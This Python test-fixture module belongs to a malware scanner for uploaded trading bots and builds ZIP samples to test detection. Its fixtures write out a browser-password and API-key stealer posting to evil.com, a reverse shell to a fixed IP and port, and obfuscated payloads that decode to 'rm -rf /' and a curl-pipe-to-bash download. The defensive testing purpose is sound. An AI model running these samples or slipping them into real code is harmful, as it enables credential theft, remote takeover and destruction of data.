import io
import zipfile
from typing import Dict, Any, List

from src.rule_manager import RuleManager


class MockStorageClient:
    """Mock storage client for testing"""

    def __init__(self):
        self.files = {}  # Dictionary to store mock files
        self.should_raise = False
        self.raise_exception = None

    def add_file(self, gcs_path: str, content: bytes):
        """Add a mock file to the storage"""
        self.files[gcs_path] = content

    def set_exception(self, exception: Exception):
        """Set an exception to be raised on next download"""
        self.should_raise = True
        self.raise_exception = exception

    def download_file(self, gcs_path: str) -> bytes:
        """Mock file download"""
        if self.should_raise:
            self.should_raise = False
            raise self.raise_exception

        if gcs_path not in self.files:
            raise FileNotFoundError(f"Mock file not found: {gcs_path}")

        return self.files[gcs_path]

    def clear_exception(self):
        self.should_raise = False


class MockDatabaseClient:
    """Mock database client for testing"""

    def __init__(self):
        self.updates = []  # Track all updates
        self.should_raise = False
        self.raise_exception = None

    def set_exception(self, exception: Exception):
        """Set an exception to be raised on next update"""
        self.should_raise = True
        self.raise_exception = exception

    def update_bot_status(
        self, bot_id: str, status: str, review_data: Dict[str, Any]
    ) -> None:
        """Mock database update"""
        if self.should_raise:
            self.should_raise = False
            raise self.raise_exception

        self.updates.append(
            {"bot_id": bot_id, "status": status, "review_data": review_data}
        )

    def get_last_update(self) -> Dict[str, Any]:
        """Get the most recent update"""
        return self.updates[-1] if self.updates else None

    def clear_updates(self):
        """Clear update history"""
        self.updates.clear()


class MockRuleManager:
    """
    Mock rule manager for testing specific threat scenarios
    """

    def __init__(self):
        self.scan_history = []
        self.rules = {}  # Map of rule patterns to results
        self.default_result = (0, [])

    def add_rule(self, pattern: bytes, score: int, matches: List[Dict[str, Any]]):
        """Add a rule that triggers when pattern is found in content"""
        self.rules[pattern] = (score, matches)

    def set_default_result(self, score: int, matches: List[Dict[str, Any]]):
        """Set default result when no rules match"""
        self.default_result = (score, matches)

    def load_and_compile_rules(self) -> bool:
        """Mock rule loading - always succeeds"""
        return True

    def scan(self, content: bytes, filename: str) -> tuple:
        """Mock scanning with configurable results"""
        self.scan_history.append({"content": content, "filename": filename})

        # Check rules in order of addition
        for pattern, result in self.rules.items():
            if pattern in content:
                return result

        return self.default_result

    def get_scan_history(self) -> List[Dict[str, Any]]:
        """Get history of all scans performed"""
        return self.scan_history.copy()

    def clear_history(self):
        """Clear scan history"""
        self.scan_history.clear()

    def clear_rules(self):
        """Clear all rules"""
        self.rules.clear()

    def reset(self):
        """Reset all state"""
        self.clear_history()
        self.clear_rules()
        self.default_result = (0, [])


class TestZipBuilder:
    """
    Utility class for building test ZIP files with various configurations
    """

    def __init__(self):
        self.files = {}

    def add_file(self, filename: str, content: bytes):
        """Add a file to the ZIP"""
        self.files[filename] = content
        return self

    def add_text_file(self, filename: str, content: str):
        """Add a text file to the ZIP"""
        self.files[filename] = content.encode("utf-8")
        return self

    def add_safe_trading_bot(self):
        """Add a safe trading bot structure"""
        self.add_text_file(
            "bot.py",
            '''
import ccxt
import logging

class SafeTradingBot:
    def __init__(self, config):
        # Proper API key management
        self.api_key = config.get('api_key')
        self.secret = config.get('secret')

        if not self.api_key or not self.secret:
            raise ValueError("API credentials not found in environment")

        self.exchange = ccxt.binance({
            'apiKey': self.api_key,
            'secret': self.secret,
            'sandbox': True
        })

        self.logger = logging.getLogger(__name__)

    def get_balance(self):
        """Get account balance safely"""
        try:
            return self.exchange.fetch_balance()
        except Exception as e:
            self.logger.error(f"Failed to fetch balance: {e}")
            return None

    def place_limit_order(self, symbol, side, amount, price):
        """Place a limit order with validation"""
        if amount <= 0 or price <= 0:
            raise ValueError("Amount and price must be positive")

        return self.exchange.create_limit_order(symbol, side, amount, price)
''',
        )

        self.add_text_file(
            "config.json",
            """
{
    "name": "Safe Grid Bot",
    "version": "1.0.0",
    "description": "A safe grid trading bot",
    "parameters": {
        "symbol": "BTC/USDT",
        "grid_size": 10,
        "max_position": 0.1
    }
}
""",
        )

        self.add_text_file(
            "requirements.txt",
            """
ccxt>=4.0.0
numpy>=1.21.0
pandas>=1.3.0
""",
        )
        return self

    def add_malicious_code_injection(self):
        """Add malicious code injection patterns"""
        self.add_text_file(
            "malicious.py",
            """
import sys
import base64

def execute_strategy():
    # Hidden malicious payload
    user_input = sys.argv[1] if len(sys.argv) > 1 else ""

    # CRITICAL: Code injection vulnerability
    result = eval(user_input)

    # CRITICAL: Execute arbitrary code
    encoded_payload = "aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ3JtIC1yZiAvJyk="
    decoded = base64.b64decode(encoded_payload)
    exec(decoded)

    return result
""",
        )
        return self

    def add_credential_theft(self):
        """Add credential theft patterns"""
        self.add_text_file(
            "stealer.py",
            """
import os
import sqlite3
import shutil
import requests

def steal_browser_passwords():
    # Steal Chrome passwords
    chrome_path = os.path.expanduser("~/.config/google-chrome/Default/Login Data")
    temp_db = "/tmp/stolen_passwords.db"

    try:
        shutil.copy(chrome_path, temp_db)
        conn = sqlite3.connect(temp_db)
        cursor = conn.execute("SELECT origin_url, username_value, password_value FROM logins")

        stolen_creds = []
        for row in cursor.fetchall():
            stolen_creds.append({
                'url': row[0],
                'username': row[1], 
                'password': row[2]
            })

        # Exfiltrate to attacker server
        requests.post("http://evil.com/collect", json=stolen_creds)

    except Exception:
        pass

def steal_api_keys():
    # Search for hardcoded API keys
    api_patterns = [
        'BINANCE_API_KEY',
        'COINBASE_API_KEY',
        'api_key',
        'secret_key'
    ]

    for var in api_patterns:
        value = os.getenv(var)
        if value:
            requests.post("http://evil.com/keys", data={'key': var, 'value': value})
""",
        )
        return self

    def add_reverse_shell(self):
        """Add reverse shell patterns"""
        self.add_text_file(
            "backdoor.py",
            """
import socket
import subprocess
import threading

def establish_backdoor():
    try:
        # Connect to attacker's server
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("192.168.1.100", 4444))

        while True:
            # Receive commands from attacker
            cmd = s.recv(1024).decode('utf-8')

            if cmd.lower() == 'exit':
                break

            # Execute commands on victim machine
            try:
                output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
                s.send(output)
            except Exception as e:
                s.send(str(e).encode())

        s.close()
    except Exception:
        pass

def start_background_backdoor():
    # Run backdoor in background thread
    backdoor_thread = threading.Thread(target=establish_backdoor)
    backdoor_thread.daemon = True
    backdoor_thread.start()
""",
        )
        return self

    def add_hardcoded_credentials(self):
        """Add hardcoded credential patterns"""
        self.add_text_file(
            "config.py",
            """
# CRITICAL: Hardcoded API credentials
BINANCE_API_KEY = "8xKj9mN2pQ7rS5tU4vW6xY8zA1bC3dE5fG7hI9jK2lM4nO6pQ8rS0tU2vW4xY6zA"
BINANCE_SECRET = "9yLk0mN3qR8sT6uX7wZ9aB2cD4eF6gH8iJ0kL2mN4oP6qR8sT0uV2wX4yZ6aB8cD"

# Database credentials
DB_PASSWORD = "super_secret_password_123"
ADMIN_TOKEN = "admin_token_abcd1234efgh5678"

# External service keys
TELEGRAM_BOT_TOKEN = "123456789:ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghi"
WEBHOOK_SECRET = "webhook_secret_key_xyz789"

# AWS credentials (even worse!)
AWS_ACCESS_KEY_ID = "AKIAIOSFODNN7EXAMPLE"
AWS_SECRET_ACCESS_KEY = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
""",
        )
        return self

    def add_obfuscated_malware(self):
        """Add obfuscated malware patterns"""
        self.add_text_file(
            "obfuscated.py",
            """
import base64
import binascii
import codecs

# Base64 obfuscated payload
encoded_payload = "aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2N1cmwgaHR0cDovL2V2aWwuY29tL3N0ZWFsLnNoIHwgYmFzaCcp"
decoded_payload = base64.b64decode(encoded_payload)
exec(decoded_payload)

# Hex obfuscated payload
hex_payload = "696d706f7274206f733b206f732e73797374656d2822726d202d7266202f22293b"
hex_decoded = binascii.unhexlify(hex_payload)
exec(hex_decoded.decode())

# ROT13 obfuscated payload
rot13_payload = "vzcbeg bf; bf.flfgrz('ez -es /')"
rot13_decoded = codecs.decode(rot13_payload, 'rot13')
exec(rot13_decoded)

# Character concatenation obfuscation
obfuscated_cmd = chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(32)+chr(111)+chr(115)
exec(obfuscated_cmd)
""",
        )
        return self

    def add_suspicious_but_not_malicious(self):
        """Add suspicious but potentially legitimate patterns"""
        self.add_text_file(
            "suspicious.py",
            """
import subprocess
import requests
import sqlite3

def system_health_check():
    # Could be legitimate system monitoring
    try:
        disk_usage = subprocess.check_output(['df', '-h'], text=True)
        memory_info = subprocess.check_output(['free', '-m'], text=True)

        # Send health data to monitoring service
        health_data = {
            'disk': disk_usage,
            'memory': memory_info
        }

        requests.post('https://monitoring.example.com/health', json=health_data)
    except Exception:
        pass

def backup_trade_history():
    # Could be legitimate data backup
    conn = sqlite3.connect('trades.db')
    cursor = conn.execute('SELECT * FROM trade_history')

    trades = cursor.fetchall()

    # Backup to external service
    requests.post('https://backup.example.com/trades', json=trades)
    conn.close()
""",
        )
        return self

    def add_empty_files(self, count: int = 5):
        """Add empty files to test file handling"""
        for i in range(count):
            self.add_file(f"empty_{i}.py", b"")
        return self

    def add_large_file(self, filename: str = "large.py", size_kb: int = 100):
        """Add a large file to test size limits"""
        content = b"# Large file\n" + (b"# padding\n" * (size_kb * 10))
        self.add_file(filename, content)
        return self

    def add_non_code_files(self):
        """Add non-code files that shouldn't be scanned"""
        self.add_file(
            "image.png",
            b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01",
        )
        self.add_file("data.csv", b"name,value\ntest,123\n")
        self.add_file("binary.dat", b"\x00\x01\x02\x03\x04\x05")
        return self

    def build(self) -> bytes:
        """Build the ZIP file and return bytes"""
        zip_buffer = io.BytesIO()
        with zipfile.ZipFile(zip_buffer, "w", zipfile.ZIP_DEFLATED) as zip_file:
            for filename, content in self.files.items():
                zip_file.writestr(filename, content)
        return zip_buffer.getvalue()

    def clear(self):
        """Clear all files"""
        self.files.clear()
        return self


class ThreatScenarios:
    """
    Predefined threat scenarios for testing
    """

    @staticmethod
    def create_legitimate_trading_bot() -> bytes:
        """Create a legitimate trading bot ZIP"""
        return TestZipBuilder().add_safe_trading_bot().build()

    @staticmethod
    def create_code_injection_bot() -> bytes:
        """Create a bot with code injection vulnerabilities"""
        return TestZipBuilder().add_malicious_code_injection().build()

    @staticmethod
    def create_credential_stealer() -> bytes:
        """Create a credential stealing bot"""
        return (
            TestZipBuilder().add_credential_theft().add_hardcoded_credentials().build()
        )

    @staticmethod
    def create_backdoor_bot() -> bytes:
        """Create a bot with backdoor functionality"""
        return TestZipBuilder().add_reverse_shell().build()

    @staticmethod
    def create_obfuscated_malware() -> bytes:
        """Create obfuscated malware"""
        return TestZipBuilder().add_obfuscated_malware().build()

    @staticmethod
    def create_sophisticated_apt() -> bytes:
        """Create sophisticated APT-style malware"""
        return (
            TestZipBuilder()
            .add_safe_trading_bot()  # Legitimate cover
            .add_credential_theft()  # Data theft
            .add_reverse_shell()  # Persistence
            .add_obfuscated_malware()  # Evasion
            .build()
        )

    @staticmethod
    def create_suspicious_but_safe() -> bytes:
        """Create suspicious but potentially legitimate bot"""
        return TestZipBuilder().add_suspicious_but_not_malicious().build()

    @staticmethod
    def create_file_bomb() -> bytes:
        """Create a ZIP with too many files"""
        builder = TestZipBuilder()
        for i in range(350):  # Exceed file limit
            builder.add_text_file(f"file_{i}.py", f'# File {i}\nprint("hello")')
        return builder.build()


class TestDataGenerator:
    """
    Generate test data for various scenarios
    """

    @staticmethod
    def create_bot_data(
        name: str, gcs_path: str, user_id: str = "test_user"
    ) -> Dict[str, Any]:
        """Create standard bot data structure"""
        return {
            "name": name,
            "config": {
                "name": name,
                "description": f"Test bot: {name}",
                "type": "trading",
                "author": "Test Author",
                "entrypoints": {"bot": "bot.py"},
            },
            "gcsPath": gcs_path,
            "userId": user_id,
        }

    @staticmethod
    def create_invalid_bot_data() -> Dict[str, Any]:
        """Create invalid bot data for testing validation"""
        return {
            "name": "Invalid Bot",
            # Missing required fields
        }

    @staticmethod
    def create_rule_match(rule_name: str, severity: str = "medium") -> Dict[str, Any]:
        """Create a YARA rule match for testing"""
        return {
            "rule": rule_name,
            "severity": severity,
            "description": f"Test rule {rule_name}",
            "tags": ["test"],
        }


def setup_test_environment():
    """
    Set up a complete test environment with mocks and test data
    """
    # Create mock clients
    storage_client = MockStorageClient()
    database_client = MockDatabaseClient()

    # Add common test files
    storage_client.add_file(
        "gs://test/safe-bot.zip", ThreatScenarios.create_legitimate_trading_bot()
    )

    storage_client.add_file(
        "gs://test/malicious-bot.zip", ThreatScenarios.create_code_injection_bot()
    )

    storage_client.add_file(
        "gs://test/credential-stealer.zip", ThreatScenarios.create_credential_stealer()
    )

    return storage_client, database_client
